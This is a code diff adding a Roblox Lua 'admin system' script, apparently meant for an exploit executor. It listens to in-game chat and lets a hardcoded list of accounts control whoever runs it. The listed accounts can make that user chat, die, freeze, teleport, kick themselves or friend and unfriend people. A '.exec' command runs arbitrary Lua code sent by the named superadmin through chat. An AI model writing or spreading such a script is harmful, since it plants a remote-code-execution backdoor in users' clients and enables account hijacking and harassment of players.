@@ -1,0 +1,287 @@
+
+--I============================================================I--
+--I admin syst v29 made with love and pure rage by yours truly I--
+--I============================================================I--
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local TextChatService = game:GetService("TextChatService")
+
+local LocalPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
+
+local RBXGeneral = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+
+local scriptedPlayers = {}
+scriptedPlayers[LocalPlayer] = true
+
+local superAdmins = {
+    ["BobHUBtest4"] = true
+}
+
+local admins = {
+    ["expfps"] = true,
+    ["EndOfReset"] = true,
+    ["imagineusingsolara"] = true,
+    ["ThriIl3Rz"] = true,
+	["zacking174_yt"] = true,
+	["alanExt2_intyV04s2z"] = true,
+	["Spelluncis"] = true
+}
+
+-- ⭐
+local commandHelp = {
+    ".chat (target) (text)",
+    ".kick (target)",
+    ".kill (target)",
+    ".bring (target)",
+    ".spin (target)",
+    ".unspin",
+    ".fps (target) (cap)",
+    ".freeze (target)",
+    ".thaw (target)",
+    ".friend (target)",
+    ".unfriend (target)",
+    ".exec (target) (lua code)",
+    ".cmds"
+}
+
+local frozenPlayers = {}
+
+local function getRole(name)
+    if superAdmins[name] then
+        return "superadmin"
+    elseif admins[name] then
+        return "admin"
+    else
+        return "user"
+    end
+end
+
+local function resolveTargets(input)
+    if not input then return {} end
+    input = input:lower()
+    local results = {}
+
+    if input == "all" then
+        for player in pairs(scriptedPlayers) do
+            table.insert(results, player)
+        end
+        return results
+    end
+
+    for _, plr in ipairs(Players:GetPlayers()) do
+        local uname = plr.Name:lower()
+        local dname = (plr.DisplayName or ""):lower()
+        if uname:sub(1, #input) == input or dname:sub(1, #input) == input then
+            table.insert(results, plr)
+        end
+    end
+
+    return results
+end
+
+local function toggleBlock(player, enable)
+    local char = player.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+
+    if enable then
+        if not hrp:FindFirstChild("Block") then
+            local bv = Instance.new("BodyVelocity")
+            bv.Name = "Block"
+            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+            bv.Velocity = Vector3.zero
+            bv.Parent = hrp
+        end
+    else
+        local bv = hrp:FindFirstChild("Block")
+        if bv then bv:Destroy() end
+    end
+end
+
+local function freezePlayer(player, enable)
+    if not scriptedPlayers[player] then return end
+    local char = player.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    if hrp then
+        hrp.Anchored = enable
+    end
+end
+
+local spin = false
+local spinTarget = nil
+
+local function sendToChat(msg)
+    if RBXGeneral and msg then
+        pcall(function()
+            RBXGeneral:SendAsync(msg)
+        end)
+    end
+end
+
+local function handleMessage(sender, text)
+    local senderRole = getRole(sender.Name)
+    if senderRole == "user" then return end
+
+    local args = {}
+    for word in text:gmatch("%S+") do
+        table.insert(args, word)
+    end
+    if #args < 1 then return end
+
+    local cmd = args[1]:lower()
+    local targets = resolveTargets(args[2])
+
+    if cmd == ".chat" then
+        local msg = table.concat(args, " ", 3)
+        if msg ~= "" then
+            for _, target in ipairs(targets) do
+                if target == LocalPlayer then
+                    sendToChat(msg)
+                end
+            end
+        end
+
+    elseif cmd == ".kick" then
+    local reason = table.concat(args, " ", 3)
+
+    if reason == "" then
+        reason = "They didnt wanna say why ig"
+    end
+
+    for _, target in ipairs(targets) do
+        local message =
+            "Kicked by: " .. sender.DisplayName .. " (@" .. sender.Name .. ")\n" ..
+            "Reason: " .. reason
+
+        target:Kick(message)
+    end
+
+    elseif cmd == ".kill" then
+        for _, target in ipairs(targets) do
+            local hum = target.Character and target.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.Health = 0 end
+        end
+
+    elseif cmd == ".bring" then
+        for _, target in ipairs(targets) do
+            local hrp = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
+            local senderHRP = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart")
+            if hrp and senderHRP then
+                hrp.CFrame = senderHRP.CFrame + Vector3.new(0, 0, -3)
+                toggleBlock(target, true)
+                task.delay(1, function()
+                    toggleBlock(target, false)
+                end)
+            end
+        end
+
+    elseif cmd == ".spin" then
+        for _, target in ipairs(targets) do
+            spin = true
+            spinTarget = target
+        end
+
+    elseif cmd == ".unspin" then
+        spin = false
+        spinTarget = nil
+
+    elseif cmd == ".fps" then
+        local cap = tonumber(args[3])
+        if cap and setfpscap then
+            setfpscap(cap)
+        end
+
+    elseif cmd == ".freeze" then
+        for _, target in ipairs(targets) do
+            frozenPlayers[target] = true
+            freezePlayer(target, true)
+        end
+
+    elseif cmd == ".thaw" then
+        for _, target in ipairs(targets) do
+            frozenPlayers[target] = nil
+            freezePlayer(target, false)
+        end
+
+    elseif cmd == ".friend" then
+        local msgs = {
+            "Welcome aboard!",
+            "Hello friend :3",
+            "Yay, we're friends now!",
+            "Added you, hope you're ready!",
+            "Friendship initiated!"
+        }
+        for _, target in ipairs(targets) do
+            if target ~= LocalPlayer then
+                pcall(function()
+                    LocalPlayer:RequestFriendship(target)
+                    sendToChat("friended " .. target.Name .. ", " .. msgs[math.random(#msgs)])
+                end)
+            end
+        end
+
+    elseif cmd == ".unfriend" then
+        local msgs = {
+            "because I was told to",
+            "just for fun lol",
+            "i was too cool to stay friends with u anyway",
+            "sry not sry :3",
+            "goodbye forever!"
+        }
+        for _, target in ipairs(targets) do
+            if LocalPlayer:IsFriendsWith(target.UserId) then
+                pcall(function()
+                    LocalPlayer:RevokeFriendship(target)
+                    sendToChat("just unfriended " .. target.Name .. " " .. msgs[math.random(#msgs)])
+                end)
+            end
+        end
+
+    elseif cmd == ".exec" then
+        if senderRole ~= "superadmin" then return end
+        local code = table.concat(args, " ", 3)
+        if code ~= "" and targets[1] == LocalPlayer then
+            local fn, err = loadstring(code)
+            if fn then pcall(fn) else warn(err) end
+        end
+
+    -- ⭐ yippy
+    elseif cmd == ".cmds" then
+        if senderRole == "user" then return end
+
+        -- split 3 chunx
+        local chunkSize = math.ceil(#commandHelp / 3)
+        for i = 1, #commandHelp, chunkSize do
+            local chunk = {}
+            for j = i, math.min(i + chunkSize - 1, #commandHelp) do
+                table.insert(chunk, commandHelp[j])
+            end
+            local message = table.concat(chunk, "\n")
+            sendToChat(message) -- send publicly
+        end
+    end
+end
+
+local function connectPlayer(player)
+    player.Chatted:Connect(function(msg)
+        handleMessage(player, msg)
+    end)
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    connectPlayer(player)
+end
+
+Players.PlayerAdded:Connect(connectPlayer)
+
+RunService.Heartbeat:Connect(function()
+    if not spin or not spinTarget then return end
+    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    local targetHRP = spinTarget.Character and spinTarget.Character:FindFirstChild("HumanoidRootPart")
+    if hrp and targetHRP then
+        local a = tick() * 2
+        hrp.CFrame = targetHRP.CFrame * CFrame.new(math.cos(a) * 8, 2, math.sin(a) * 8)
+    end
+end)
+
+print("V29 Loaded, by oats, for", LocalPlayer.DisplayName)
